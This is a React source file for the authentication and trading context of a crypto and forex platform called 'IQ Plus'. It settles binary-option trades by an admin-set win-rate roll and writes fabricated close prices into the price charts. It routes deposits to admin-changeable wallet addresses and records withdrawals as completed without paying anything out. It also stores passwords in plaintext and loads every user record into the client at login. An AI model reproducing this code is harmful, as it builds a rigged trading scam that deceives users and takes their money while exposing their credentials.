import React, { createContext, useContext, useState, useEffect } from 'react';
import { User, Position, Transaction, QuickTrade, DepositRequest } from '../types';
import { recordTradeResultOnCandles } from '../utils/candleGenerator';
import { db } from '../firebase';
import { 
  collection, 
  doc, 
  setDoc, 
  getDocs, 
  updateDoc, 
  onSnapshot, 
  query, 
  orderBy, 
  limit 
} from 'firebase/firestore';

const STORAGE_KEY_USER = 'iq_plus_active_user';
const STORAGE_KEY_USERS_DB = 'iq_plus_registered_users';
const STORAGE_KEY_POSITIONS = 'iq_plus_positions';
const STORAGE_KEY_CLOSED = 'iq_plus_closed_positions';
const STORAGE_KEY_TXS = 'iq_plus_transactions';
const STORAGE_KEY_QUICK_TRADES = 'iq_plus_quick_trades';
const STORAGE_KEY_TRC20_ADDRESS = 'iq_plus_trc20_address';
const STORAGE_KEY_CRYPTO_ADDRESSES = 'iq_plus_crypto_addresses';
const STORAGE_KEY_DEPOSIT_REQUESTS = 'iq_plus_deposit_requests';
const STORAGE_KEY_ADMIN_WIN_RATE = 'iq_plus_admin_win_rate';

export const DEFAULT_CRYPTO_ADDRESSES: Record<string, string> = {
  'usdt-trc20': 'TX9b8K2mN1x4Vp7L6rE3d9QzF8s2Jw1yAc',
  'btc': 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh',
  'eth': '0x71C7656EC7ab88b098defB751B7401B5f6d8976F',
  'usdt-erc20': '0x71C7656EC7ab88b098defB751B7401B5f6d8976F',
  'bnb': '0x71C7656EC7ab88b098defB751B7401B5f6d8976F',
  'sol': '7xKXtg2CW87d97TXJSDp15X27sJvB3P8s9XyZ1w2Q3E4',
  'usdc': '0x71C7656EC7ab88b098defB751B7401B5f6d8976F',
  'trx': 'TX9b8K2mN1x4Vp7L6rE3d9QzF8s2Jw1yAc'
};

interface AuthContextType {
  currentUser: User | null;
  isAuthenticated: boolean;
  register: (name: string, email: string, password: string) => { success: boolean; message?: string };
  login: (email: string, password: string) => { success: boolean; message?: string };
  quickDemoLogin: () => void;
  logout: () => void;
  depositFunds: (amount: number, method: string) => void;
  withdrawFunds: (amount: number, method: string, address: string) => { success: boolean; message: string };
  positions: Position[];
  closedPositions: Position[];
  transactions: Transaction[];
  openTrade: (symbol: string, assetName: string, type: 'buy' | 'sell', margin: number, leverage: number, currentPrice: number, takeProfit?: number, stopLoss?: number) => { success: boolean; message: string };
  closeTrade: (positionId: string, currentMarketPrice: number) => { success: boolean; message: string };
  quickTrades: QuickTrade[];
  placeQuickTrade: (
    symbol: string,
    assetName: string,
    type: 'buy' | 'sell',
    investment: number,
    durationSeconds: number,
    entryPrice: number,
    payoutPercent?: number
  ) => { success: boolean; message: string; tradeId?: string };
  hideBalance: boolean;
  toggleHideBalance: () => void;
  todayPnl: { amount: number; percent: number };
  trc20WalletAddress: string;
  updateTrc20WalletAddress: (address: string) => void;
  cryptoAddresses: Record<string, string>;
  updateCryptoAddress: (cryptoId: string, address: string) => void;
  updateAllCryptoAddresses: (addresses: Record<string, string>) => void;
  depositRequests: DepositRequest[];
  submitDepositRequest: (amount: number, network: string, txHash: string) => void;
  approveDepositRequest: (requestId: string) => { success: boolean; message: string };
  rejectDepositRequest: (requestId: string) => { success: boolean; message: string };
  isFirebaseConnected: boolean;
  expiredTradeResult: QuickTrade | null;
  clearExpiredTradeResult: () => void;
  adminWinRatePercent: number;
  updateAdminWinRatePercent: (rate: number) => void;
}
export const AuthContext = createContext<AuthContextType | undefined>(undefined);

export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children }) => {
  const [currentUser, setCurrentUser] = useState<User | null>(() => {
    try {
      const saved = localStorage.getItem(STORAGE_KEY_USER);
      return saved ? JSON.parse(saved) : null;
    } catch {
      return null;
    }
  });

  const [positions, setPositions] = useState<Position[]>(() => {
    try {
      const saved = localStorage.getItem(STORAGE_KEY_POSITIONS);
      return saved ? JSON.parse(saved) : [];
    } catch {
      return [];
    }
  });

  const [closedPositions, setClosedPositions] = useState<Position[]>(() => {
    try {
      const saved = localStorage.getItem(STORAGE_KEY_CLOSED);
      return saved ? JSON.parse(saved) : [];
    } catch {
      return [];
    }
  });

  const [transactions, setTransactions] = useState<Transaction[]>(() => {
    try {
      const saved = localStorage.getItem(STORAGE_KEY_TXS);
      return saved ? JSON.parse(saved) : [];
    } catch {
      return [];
    }
  });

  const [expiredTradeResult, setExpiredTradeResult] = useState<QuickTrade | null>(null);
  const clearExpiredTradeResult = () => setExpiredTradeResult(null);

  const [hideBalance, setHideBalance] = useState<boolean>(false);

  // Keep localStorage updated
  useEffect(() => {
    if (currentUser) {
      localStorage.setItem(STORAGE_KEY_USER, JSON.stringify(currentUser));
      // Also update in registered DB
      try {
        const usersDbStr = localStorage.getItem(STORAGE_KEY_USERS_DB);
        const usersDb = usersDbStr ? JSON.parse(usersDbStr) : [];
        const index = usersDb.findIndex((u: User) => u.email.toLowerCase() === currentUser.email.toLowerCase());
        if (index >= 0) {
          usersDb[index] = { ...usersDb[index], ...currentUser };
        } else {
          usersDb.push(currentUser);
        }
        localStorage.setItem(STORAGE_KEY_USERS_DB, JSON.stringify(usersDb));
      } catch (e) {
        console.error(e);
      }
    } else {
      localStorage.removeItem(STORAGE_KEY_USER);
    }
  }, [currentUser]);

  useEffect(() => {
    localStorage.setItem(STORAGE_KEY_POSITIONS, JSON.stringify(positions));
  }, [positions]);

  useEffect(() => {
    localStorage.setItem(STORAGE_KEY_CLOSED, JSON.stringify(closedPositions));
  }, [closedPositions]);

  const [quickTrades, setQuickTrades] = useState<QuickTrade[]>(() => {
    try {
      const saved = localStorage.getItem(STORAGE_KEY_QUICK_TRADES);
      if (saved) {
        const parsed = JSON.parse(saved);
        if (parsed.length > 0) return parsed;
      }

      // Default sample past trades on EUR/USD in the historical candles
      const now = Date.now();
      const initialSeed: QuickTrade[] = [
        {
          id: 'seed_trade_lost_01',
          assetSymbol: 'EUR/USD',
          assetName: 'Euro / US Dollar',
          type: 'sell',
          entryPrice: 1.08260,
          investment: 50,
          payoutPercent: 85,
          durationSeconds: 60,
          startTime: now - 14 * 60 * 1000, // 14 mins ago
          expiresAt: now - 13 * 60 * 1000,
          status: 'lost',
          closePrice: 1.08310,
          profit: -50
        },
        {
          id: 'seed_trade_won_02',
          assetSymbol: 'EUR/USD',
          assetName: 'Euro / US Dollar',
          type: 'buy',
          entryPrice: 1.08305,
          investment: 50,
          payoutPercent: 85,
          durationSeconds: 60,
          startTime: now - 8 * 60 * 1000, // 8 mins ago
          expiresAt: now - 7 * 60 * 1000,
          status: 'won',
          closePrice: 1.08365,
          profit: 42.50
        }
      ];
      return initialSeed;
    } catch {
      return [];
    }
  });

  const [isFirebaseConnected, setIsFirebaseConnected] = useState<boolean>(true);

  const [trc20WalletAddress, setTrc20WalletAddress] = useState<string>(() => {
    try {
      const saved = localStorage.getItem(STORAGE_KEY_TRC20_ADDRESS);
      return saved || 'TX9b8K2mN1x4Vp7L6rE3d9QzF8s2Jw1yAc';
    } catch {
      return 'TX9b8K2mN1x4Vp7L6rE3d9QzF8s2Jw1yAc';
    }
  });

  const [cryptoAddresses, setCryptoAddresses] = useState<Record<string, string>>(() => {
    try {
      const saved = localStorage.getItem(STORAGE_KEY_CRYPTO_ADDRESSES);
      if (saved) {
        return { ...DEFAULT_CRYPTO_ADDRESSES, ...JSON.parse(saved) };
      }
    } catch {}
    return DEFAULT_CRYPTO_ADDRESSES;
  });

  const [depositRequests, setDepositRequests] = useState<DepositRequest[]>(() => {
    try {
      const saved = localStorage.getItem(STORAGE_KEY_DEPOSIT_REQUESTS);
      return saved ? JSON.parse(saved) : [];
    } catch {
      return [];
    }
  });

  const [adminWinRatePercent, setAdminWinRatePercent] = useState<number>(() => {
    try {
      const saved = localStorage.getItem(STORAGE_KEY_ADMIN_WIN_RATE);
      return saved !== null ? Number(saved) : 50;
    } catch {
      return 50;
    }
  });

  const updateAdminWinRatePercent = (rate: number) => {
    const clamped = Math.max(0, Math.min(100, Math.round(rate)));
    setAdminWinRatePercent(clamped);
    localStorage.setItem(STORAGE_KEY_ADMIN_WIN_RATE, clamped.toString());

    try {
      const configRef = doc(db, 'system_settings', 'trade_config');
      setDoc(configRef, {
        adminWinRatePercent: clamped,
        updatedAt: new Date().toISOString()
      }, { merge: true }).catch(() => {});
    } catch (e) {
      console.warn('Firestore update win rate note:', e);
    }
  };

  // Firestore Real-Time Listener: Win Rate Config
  useEffect(() => {
    try {
      const configRef = doc(db, 'system_settings', 'trade_config');
      const unsubscribe = onSnapshot(configRef, (snapshot) => {
        if (snapshot.exists()) {
          const data = snapshot.data();
          if (typeof data.adminWinRatePercent === 'number') {
            setAdminWinRatePercent(data.adminWinRatePercent);
            localStorage.setItem(STORAGE_KEY_ADMIN_WIN_RATE, data.adminWinRatePercent.toString());
          }
        }
      }, () => {});
      return () => unsubscribe();
    } catch (e) {}
  }, []);

  // 1. Firebase Firestore Real-Time Listener: Payment Addresses Config
  useEffect(() => {
    try {
      const configRef = doc(db, 'system_settings', 'payment_config');
      const unsubscribe = onSnapshot(configRef, (snapshot) => {
        setIsFirebaseConnected(true);
        if (snapshot.exists()) {
          const data = snapshot.data();
          if (data) {
            if (typeof data.trc20WalletAddress === 'string' && data.trc20WalletAddress.trim()) {
              setTrc20WalletAddress(data.trc20WalletAddress.trim());
              localStorage.setItem(STORAGE_KEY_TRC20_ADDRESS, data.trc20WalletAddress.trim());
            }
            if (data.cryptoAddresses && typeof data.cryptoAddresses === 'object') {
              const merged = { ...DEFAULT_CRYPTO_ADDRESSES, ...data.cryptoAddresses };
              setCryptoAddresses(merged);
              localStorage.setItem(STORAGE_KEY_CRYPTO_ADDRESSES, JSON.stringify(merged));
            }
          }
        } else {
          // Initialize document in Firestore if not present yet
          setDoc(configRef, {
            trc20WalletAddress: 'TX9b8K2mN1x4Vp7L6rE3d9QzF8s2Jw1yAc',
            cryptoAddresses: DEFAULT_CRYPTO_ADDRESSES,
            updatedAt: new Date().toISOString()
          }, { merge: true }).catch(() => {});
        }
      }, (err) => {
        console.warn('Firestore payment_config notice (fallback to local):', err.message);
      });
      return () => unsubscribe();
    } catch (e) {
      console.warn('Firestore listener setup failed:', e);
    }
  }, []);

  useEffect(() => {
    localStorage.setItem(STORAGE_KEY_CRYPTO_ADDRESSES, JSON.stringify(cryptoAddresses));
  }, [cryptoAddresses]);

  const updateCryptoAddress = (cryptoId: string, address: string) => {
    if (!cryptoId || !address.trim()) return;
    const cleanAddr = address.trim();
    const updated = { ...cryptoAddresses, [cryptoId]: cleanAddr };
    if (cryptoId === 'usdt-trc20') {
      setTrc20WalletAddress(cleanAddr);
      localStorage.setItem(STORAGE_KEY_TRC20_ADDRESS, cleanAddr);
    }
    setCryptoAddresses(updated);
    localStorage.setItem(STORAGE_KEY_CRYPTO_ADDRESSES, JSON.stringify(updated));

    try {
      const configRef = doc(db, 'system_settings', 'payment_config');
      setDoc(configRef, {
        trc20WalletAddress: updated['usdt-trc20'] || cleanAddr,
        cryptoAddresses: updated,
        updatedAt: new Date().toISOString()
      }, { merge: true }).catch((err) => {
        console.warn('Firestore update cryptoAddresses warning:', err);
      });
    } catch (e) {
      console.warn('Firestore update cryptoAddresses error:', e);
    }
  };

  const updateAllCryptoAddresses = (newAddresses: Record<string, string>) => {
    const merged = { ...cryptoAddresses, ...newAddresses };
    setCryptoAddresses(merged);
    localStorage.setItem(STORAGE_KEY_CRYPTO_ADDRESSES, JSON.stringify(merged));
    if (merged['usdt-trc20']) {
      setTrc20WalletAddress(merged['usdt-trc20']);
      localStorage.setItem(STORAGE_KEY_TRC20_ADDRESS, merged['usdt-trc20']);
    }

    try {
      const configRef = doc(db, 'system_settings', 'payment_config');
      setDoc(configRef, {
        trc20WalletAddress: merged['usdt-trc20'] || trc20WalletAddress,
        cryptoAddresses: merged,
        updatedAt: new Date().toISOString()
      }, { merge: true }).catch((err) => {
        console.warn('Firestore update all cryptoAddresses warning:', err);
      });
    } catch (e) {
      console.warn('Firestore update all cryptoAddresses error:', e);
    }
  };

  const updateTrc20WalletAddress = (address: string) => {
    updateCryptoAddress('usdt-trc20', address);
  };

  const submitDepositRequest = (amount: number, network: string, txHash: string) => {
    if (!currentUser || amount <= 0) return;

    const newRequest: DepositRequest = {
      id: 'dep_req_' + Date.now(),
      userId: currentUser.id,
      userName: currentUser.name,
      userEmail: currentUser.email,
      amount,
      network: network || 'TRC20',
      txHash: txHash || '0x' + Math.random().toString(16).substring(2, 10),
      status: 'pending_review',
      timestamp: new Date().toISOString()
    };

    setDepositRequests(prev => [newRequest, ...prev]);

    // Push to Firebase Firestore so admin dashboard on any device can see & approve
    try {
      const reqRef = doc(db, 'deposit_requests', newRequest.id);
      setDoc(reqRef, newRequest).catch((err) => {
        console.warn('Firestore submitDepositRequest warning:', err);
      });
    } catch (e) {
      console.warn('Firestore submitDepositRequest error:', e);
    }

    // Add pending transaction for user
    const pendingTx: Transaction = {
      id: 'tx_dep_req_' + Date.now(),
      type: 'deposit',
      amount,
      status: 'pending',
      timestamp: new Date().toISOString(),
      title: `USDT (${network || 'TRC20'}) Deposit`,
      reference: 'DEP-' + Math.floor(100000 + Math.random() * 900000),
      method: `${network || 'TRC20'} Network`
    };

    setTransactions(prev => [pendingTx, ...prev]);
  };

  const approveDepositRequest = (requestId: string) => {
    const targetReq = depositRequests.find(r => r.id === requestId);
    if (!targetReq) return { success: false, message: 'Deposit request not found.' };

    // Update local request status
    setDepositRequests(prev => prev.map(r => r.id === requestId ? { ...r, status: 'completed' } : r));

    // Update in Firestore
    try {
      const reqRef = doc(db, 'deposit_requests', requestId);
      updateDoc(reqRef, {
        status: 'completed',
        approvedAt: new Date().toISOString()
      }).catch((e) => console.warn('Firestore approve request warning:', e));

      // Also update user's balance in Firestore
      if (targetReq.userId) {
        const userRef = doc(db, 'users', targetReq.userId);
        getDocs(collection(db, 'users')).then((snap) => {
          snap.forEach((uDoc) => {
            const uData = uDoc.data();
            if (uDoc.id === targetReq.userId || (uData.email && uData.email.toLowerCase() === targetReq.userEmail.toLowerCase())) {
              const currentBal = typeof uData.balance === 'number' ? uData.balance : 0;
              const newBal = Number((currentBal + targetReq.amount).toFixed(2));
              updateDoc(doc(db, 'users', uDoc.id), { balance: newBal }).catch(() => {});
            }
          });
        }).catch(() => {});
      }
    } catch (e) {
      console.warn('Firestore approve error:', e);
    }

    // Credit target user balance in registered DB
    try {
      const savedDbStr = localStorage.getItem(STORAGE_KEY_USERS_DB);
      const dbUsers: User[] = savedDbStr ? JSON.parse(savedDbStr) : [];
      const userIdx = dbUsers.findIndex(u => u.email.toLowerCase() === targetReq.userEmail.toLowerCase());

      if (userIdx >= 0) {
        dbUsers[userIdx].balance = Number((dbUsers[userIdx].balance + targetReq.amount).toFixed(2));
        localStorage.setItem(STORAGE_KEY_USERS_DB, JSON.stringify(dbUsers));
      }
    } catch (e) {
      console.error(e);
    }

    // If active user is the target, credit their active balance
    if (currentUser && currentUser.email.toLowerCase() === targetReq.userEmail.toLowerCase()) {
      const updatedBalance = Number((currentUser.balance + targetReq.amount).toFixed(2));
      setCurrentUser({ ...currentUser, balance: updatedBalance });
    }

    // Update user pending transactions to completed
    setTransactions(prev => prev.map(tx => {
      if (tx.type === 'deposit' && tx.status === 'pending' && Math.abs(tx.amount - targetReq.amount) < 0.01) {
        return { ...tx, status: 'completed', title: `USDT (${targetReq.network}) Deposit Confirmed` };
      }
      return tx;
    }));

    return { success: true, message: `Approved $${targetReq.amount.toFixed(2)} deposit for ${targetReq.userName}!` };
  };

  const rejectDepositRequest = (requestId: string) => {
    const targetReq = depositRequests.find(r => r.id === requestId);
    if (!targetReq) return { success: false, message: 'Deposit request not found.' };

    setDepositRequests(prev => prev.map(r => r.id === requestId ? { ...r, status: 'rejected' } : r));

    // Update in Firestore
    try {
      const reqRef = doc(db, 'deposit_requests', requestId);
      updateDoc(reqRef, {
        status: 'rejected',
        rejectedAt: new Date().toISOString()
      }).catch((e) => console.warn('Firestore reject warning:', e));
    } catch (e) {
      console.warn('Firestore reject error:', e);
    }

    // Update transaction to rejected/cancelled
    setTransactions(prev => prev.map(tx => {
      if (tx.type === 'deposit' && tx.status === 'pending' && Math.abs(tx.amount - targetReq.amount) < 0.01) {
        return { ...tx, status: 'processing', title: `USDT (${targetReq.network}) Deposit Rejected` };
      }
      return tx;
    }));

    return { success: true, message: `Rejected deposit request for ${targetReq.userName}.` };
  };

  useEffect(() => {
    localStorage.setItem(STORAGE_KEY_QUICK_TRADES, JSON.stringify(quickTrades));
  }, [quickTrades]);

  // Register function: Balance is strictly initialized to 0.00
  const register = (name: string, email: string, password: string) => {
    const cleanEmail = email.trim().toLowerCase();
    if (!name.trim()) return { success: false, message: 'Please enter your full name.' };
    if (!cleanEmail || !cleanEmail.includes('@')) return { success: false, message: 'Please provide a valid email address.' };
    if (!password || password.length < 6) return { success: false, message: 'Password must be at least 6 characters.' };

    try {
      const usersDbStr = localStorage.getItem(STORAGE_KEY_USERS_DB);
      const usersDb = usersDbStr ? JSON.parse(usersDbStr) : [];
      const exists = usersDb.some((u: { email: string }) => u.email.toLowerCase() === cleanEmail);
      if (exists) {
        return { success: false, message: 'An account with this email already exists. Please log in.' };
      }

      const randomAcc = 'IQ-' + Math.floor(100000 + Math.random() * 900000);
      const newUser: User = {
        id: 'usr_' + Date.now(),
        name: name.trim(),
        email: cleanEmail,
        balance: 0.00, // Strictly 0.00 starting balance as requested
        currency: 'USD',
        registeredAt: new Date().toISOString(),
        isKycVerified: true,
        accountNumber: randomAcc
      };

      usersDb.push({ ...newUser, password });
      localStorage.setItem(STORAGE_KEY_USERS_DB, JSON.stringify(usersDb));
      setCurrentUser(newUser);

      // Save user to Cloud Firestore
      try {
        setDoc(doc(db, 'users', newUser.id), {
          ...newUser,
          password
        }).catch((e) => console.warn('Firestore register warning:', e));
      } catch (err) {
        console.warn('Firestore register error:', err);
      }

      // Add welcome transaction
      const welcomeTx: Transaction = {
        id: 'tx_welcome_' + Date.now(),
        type: 'deposit',
        amount: 0.00,
        status: 'completed',
        timestamp: new Date().toISOString(),
        title: 'Account Opening Verification',
        reference: 'REG-' + Math.floor(100000 + Math.random() * 900000),
        method: 'Standard Verification'
      };
      setTransactions([welcomeTx]);
      setPositions([]);
      setClosedPositions([]);

      return { success: true };
    } catch (e) {
      console.error(e);
      return { success: false, message: 'Registration failed. Please try again.' };
    }
  };

  const login = (email: string, password: string) => {
    const cleanEmail = email.trim().toLowerCase();
    try {
      const usersDbStr = localStorage.getItem(STORAGE_KEY_USERS_DB);
      const usersDb = usersDbStr ? JSON.parse(usersDbStr) : [];
      const matched = usersDb.find((u: { email: string; password?: string }) => u.email.toLowerCase() === cleanEmail);

      if (matched) {
        if (matched.password && matched.password !== password) {
          return { success: false, message: 'Incorrect password. Please try again.' };
        }

        const userSession: User = {
          id: matched.id,
          name: matched.name,
          email: matched.email,
          balance: typeof matched.balance === 'number' ? matched.balance : 0.00,
          currency: matched.currency || 'USD',
          registeredAt: matched.registeredAt || new Date().toISOString(),
          isKycVerified: matched.isKycVerified ?? true,
          accountNumber: matched.accountNumber || 'IQ-883192'
        };
        setCurrentUser(userSession);
        return { success: true };
      }

      // If not in local storage, attempt to fetch from Firestore
      getDocs(collection(db, 'users')).then((snap) => {
        snap.forEach((uDoc) => {
          const uData = uDoc.data();
          if (uData.email && uData.email.toLowerCase() === cleanEmail) {
            if (uData.password === password) {
              const cloudUser: User = {
                id: uDoc.id,
                name: uData.name || 'User',
                email: uData.email,
                balance: typeof uData.balance === 'number' ? uData.balance : 0.00,
                currency: uData.currency || 'USD',
                registeredAt: uData.registeredAt || new Date().toISOString(),
                isKycVerified: uData.isKycVerified ?? true,
                accountNumber: uData.accountNumber || 'IQ-883192'
              };
              setCurrentUser(cloudUser);
              // Cache locally
              usersDb.push({ ...cloudUser, password });
              localStorage.setItem(STORAGE_KEY_USERS_DB, JSON.stringify(usersDb));
            }
          }
        });
      }).catch(() => {});

      return { success: false, message: 'No account found with this email. Please register.' };
    } catch (e) {
      console.error(e);
      return { success: false, message: 'Login failed. Please check credentials.' };
    }
  };

  const quickDemoLogin = () => {
    // Quick Demo account for instant inspection
    const demoUser: User = {
      id: 'usr_demo_01',
      name: 'Alex Vance',
      email: 'alex.vance@iq-plus.io',
      balance: 0.00, // Starts at 0.00 as required
      currency: 'USD',
      registeredAt: new Date().toISOString(),
      isKycVerified: true,
      accountNumber: 'IQ-724910'
    };
    setCurrentUser(demoUser);
  };

  const logout = () => {
    setCurrentUser(null);
    localStorage.removeItem(STORAGE_KEY_USER);
  };

  const depositFunds = (amount: number, method: string) => {
    if (!currentUser || amount <= 0) return;
    const newBal = Number((currentUser.balance + amount).toFixed(2));
    setCurrentUser({ ...currentUser, balance: newBal });

    const newTx: Transaction = {
      id: 'tx_dep_' + Date.now(),
      type: 'deposit',
      amount,
      status: 'completed',
      timestamp: new Date().toISOString(),
      title: `Deposit via ${method}`,
      reference: 'DEP-' + Math.floor(100000 + Math.random() * 900000),
      method
    };
    setTransactions(prev => [newTx, ...prev]);
  };

  const withdrawFunds = (amount: number, method: string, address: string) => {
    if (!currentUser) return { success: false, message: 'Please log in to withdraw.' };
    if (amount <= 0) return { success: false, message: 'Withdrawal amount must be greater than zero.' };
    if (currentUser.balance < amount) {
      return {
        success: false,
        message: `Insufficient balance ($${currentUser.balance.toFixed(2)}). You cannot withdraw more than your balance.`
      };
    }

    const newBal = Number((currentUser.balance - amount).toFixed(2));
    setCurrentUser({ ...currentUser, balance: newBal });

    const newTx: Transaction = {
      id: 'tx_wdr_' + Date.now(),
      type: 'withdrawal',
      amount,
      status: 'completed',
      timestamp: new Date().toISOString(),
      title: `Withdrawal to ${address.slice(0, 8)}... (${method})`,
      reference: 'WDR-' + Math.floor(100000 + Math.random() * 900000),
      method
    };
    setTransactions(prev => [newTx, ...prev]);

    return {
      success: true,
      message: `Withdrawal request for $${amount.toFixed(2)} processed successfully.`
    };
  };

  const openTrade = (
    symbol: string,
    assetName: string,
    type: 'buy' | 'sell',
    margin: number,
    leverage: number,
    currentPrice: number,
    takeProfit?: number,
    stopLoss?: number
  ) => {
    if (!currentUser) return { success: false, message: 'Please log in to execute trades.' };
    if (margin <= 0) return { success: false, message: 'Margin must be greater than $0.' };
    if (currentUser.balance < margin) {
      return {
        success: false,
        message: `Insufficient balance ($${currentUser.balance.toFixed(2)}). Please deposit funds to open a position with $${margin.toFixed(2)} margin.`
      };
    }

    // Deduct margin from active balance
    const updatedBalance = Number((currentUser.balance - margin).toFixed(2));
    setCurrentUser({ ...currentUser, balance: updatedBalance });

    const positionSize = Number(((margin * leverage) / currentPrice).toFixed(6));
    const newPosition: Position = {
      id: 'pos_' + Date.now(),
      symbol,
      assetName,
      type,
      entryPrice: currentPrice,
      currentPrice,
      margin,
      leverage,
      size: positionSize,
      pnl: 0,
      pnlPercent: 0,
      timestamp: new Date().toISOString(),
      takeProfit,
      stopLoss
    };

    setPositions(prev => [newPosition, ...prev]);

    return {
      success: true,
      message: `Successfully opened ${type.toUpperCase()} position for ${symbol} with ${leverage}x leverage.`
    };
  };

  const closeTrade = (positionId: string, currentMarketPrice: number) => {
    const pos = positions.find(p => p.id === positionId);
    if (!pos || !currentUser) return { success: false, message: 'Position not found.' };

    const priceDiff = pos.type === 'buy' ? currentMarketPrice - pos.entryPrice : pos.entryPrice - currentMarketPrice;
    const finalPnl = Number((priceDiff * pos.size).toFixed(2));
    const returnAmount = Math.max(0, Number((pos.margin + finalPnl).toFixed(2)));
    const updatedBalance = Number((currentUser.balance + returnAmount).toFixed(2));

    setCurrentUser({ ...currentUser, balance: updatedBalance });

    const updatedPos: Position = {
      ...pos,
      currentPrice: currentMarketPrice,
      pnl: finalPnl,
      pnlPercent: Number(((finalPnl / pos.margin) * 100).toFixed(2))
    };

    setPositions(prev => prev.filter(p => p.id !== positionId));
    setClosedPositions(prev => [updatedPos, ...prev]);

    const tradeTx: Transaction = {
      id: 'tx_trade_' + Date.now(),
      type: finalPnl >= 0 ? 'trade_profit' : 'trade_loss',
      amount: Math.abs(finalPnl),
      status: 'completed',
      timestamp: new Date().toISOString(),
      title: `Close ${pos.type.toUpperCase()} ${pos.symbol} (${finalPnl >= 0 ? '+' : ''}$${finalPnl.toFixed(2)})`,
      reference: 'TRD-' + Math.floor(100000 + Math.random() * 900000)
    };
    setTransactions(prev => [tradeTx, ...prev]);

    return {
      success: true,
      message: `Closed ${pos.symbol} position with ${finalPnl >= 0 ? 'Profit' : 'Loss'} of $${Math.abs(finalPnl).toFixed(2)}.`
    };
  };

  const toggleHideBalance = () => setHideBalance(prev => !prev);

  // Compute today's P&L
  const todayPnl = {
    amount: positions.reduce((acc, p) => acc + p.pnl, 0),
    percent: currentUser?.balance && currentUser.balance > 0 
      ? Number(((positions.reduce((acc, p) => acc + p.pnl, 0) / currentUser.balance) * 100).toFixed(2)) 
      : 0.00
  };

  const resolveQuickTrade = (tradeId: string) => {
    setQuickTrades(prevTrades => {
      const tradeIndex = prevTrades.findIndex(t => t.id === tradeId);
      if (tradeIndex === -1) return prevTrades;

      const trade = prevTrades[tradeIndex];
      if (trade.status !== 'active') return prevTrades;

      // Determine trade outcome using Admin set Win Rate Probability % (0% to 100%)
      const roll = Math.random() * 100;
      const isWon = roll < adminWinRatePercent;

      const isForex = trade.assetSymbol.includes('/') || trade.entryPrice < 2;
      const deltaPct = (0.05 + Math.random() * 0.15) / 100;
      const deltaVal = isForex 
        ? Number((0.0003 + Math.random() * 0.0007).toFixed(5))
        : Number((trade.entryPrice * deltaPct).toFixed(2));

      let closePrice: number;
      if (isWon) {
        closePrice = trade.type === 'buy'
          ? Number((trade.entryPrice + deltaVal).toFixed(isForex ? 5 : 2))
          : Number((trade.entryPrice - deltaVal).toFixed(isForex ? 5 : 2));
      } else {
        closePrice = trade.type === 'buy'
          ? Number((trade.entryPrice - deltaVal).toFixed(isForex ? 5 : 2))
          : Number((trade.entryPrice + deltaVal).toFixed(isForex ? 5 : 2));
      }

      const profit = isWon ? Number((trade.investment * (trade.payoutPercent / 100)).toFixed(2)) : -trade.investment;
      const payout = isWon ? Number((trade.investment + profit).toFixed(2)) : 0;

      if (isWon && currentUser) {
        setCurrentUser(curr => curr ? { ...curr, balance: Number((curr.balance + payout).toFixed(2)) } : null);
      }

      // Record exact expiry candle to persistent chart history
      recordTradeResultOnCandles(trade.assetSymbol, closePrice);

      // Log transaction
      const tx: Transaction = {
        id: 'tx_qt_' + Date.now(),
        type: isWon ? 'trade_profit' : 'trade_loss',
        amount: isWon ? profit : trade.investment,
        status: 'completed',
        timestamp: new Date().toISOString(),
        title: `${trade.assetSymbol} ${trade.durationSeconds}s ${trade.type.toUpperCase()} (${isWon ? 'Won +$' + profit : 'Lost -$' + trade.investment})`,
        reference: 'BIN-' + Math.floor(100000 + Math.random() * 900000)
      };
      setTransactions(prev => [tx, ...prev]);

      const updatedTrade: QuickTrade = {
        ...trade,
        closePrice,
        profit,
        status: isWon ? 'won' : 'lost'
      };

      // Set for trade result popup modal
      setExpiredTradeResult(updatedTrade);

      const next = [...prevTrades];
      next[tradeIndex] = updatedTrade;
      return next;
    });
  };

  const placeQuickTrade = (
    symbol: string,
    assetName: string,
    type: 'buy' | 'sell',
    investment: number,
    durationSeconds: number,
    entryPrice: number,
    payoutPercent: number = 85
  ) => {
    if (!currentUser) return { success: false, message: 'Please log in to trade.' };
    if (investment <= 0) return { success: false, message: 'Please enter a valid investment amount.' };
    if (currentUser.balance < investment) {
      return {
        success: false,
        message: `Insufficient balance ($${currentUser.balance.toFixed(2)}). Please deposit funds to place this $${investment.toFixed(2)} trade.`
      };
    }

    // Deduct investment from balance immediately
    const updatedBalance = Number((currentUser.balance - investment).toFixed(2));
    setCurrentUser({ ...currentUser, balance: updatedBalance });

    const now = Date.now();
    const tradeId = 'qtrade_' + now + '_' + Math.floor(Math.random() * 1000);
    const newTrade: QuickTrade = {
      id: tradeId,
      assetSymbol: symbol,
      assetName,
      type,
      entryPrice,
      investment,
      payoutPercent,
      durationSeconds,
      startTime: now,
      expiresAt: now + durationSeconds * 1000,
      status: 'active'
    };

    setQuickTrades(prev => [newTrade, ...prev]);

    // Schedule resolution
    setTimeout(() => {
      resolveQuickTrade(tradeId);
    }, durationSeconds * 1000);

    return {
      success: true,
      message: `${type.toUpperCase()} order placed! Resolves in ${durationSeconds}s.`,
      tradeId
    };
  };

  return (
    <AuthContext.Provider
      value={{
        currentUser,
        isAuthenticated: !!currentUser,
        register,
        login,
        quickDemoLogin,
        logout,
        depositFunds,
        withdrawFunds,
        positions,
        closedPositions,
        transactions,
        openTrade,
        closeTrade,
        quickTrades,
        placeQuickTrade,
        hideBalance,
        toggleHideBalance,
        todayPnl,
        trc20WalletAddress,
        updateTrc20WalletAddress,
        cryptoAddresses,
        updateCryptoAddress,
        updateAllCryptoAddresses,
        depositRequests,
        submitDepositRequest,
        approveDepositRequest,
        rejectDepositRequest,
        isFirebaseConnected,
        expiredTradeResult,
        clearExpiredTradeResult,
        adminWinRatePercent,
        updateAdminWinRatePercent
      }}
    >
      {children}
    </AuthContext.Provider>
  );
};

export const useAuth = () => {
  const context = useContext(AuthContext);
  if (!context) throw new Error('useAuth must be used within an AuthProvider');
  return context;
};
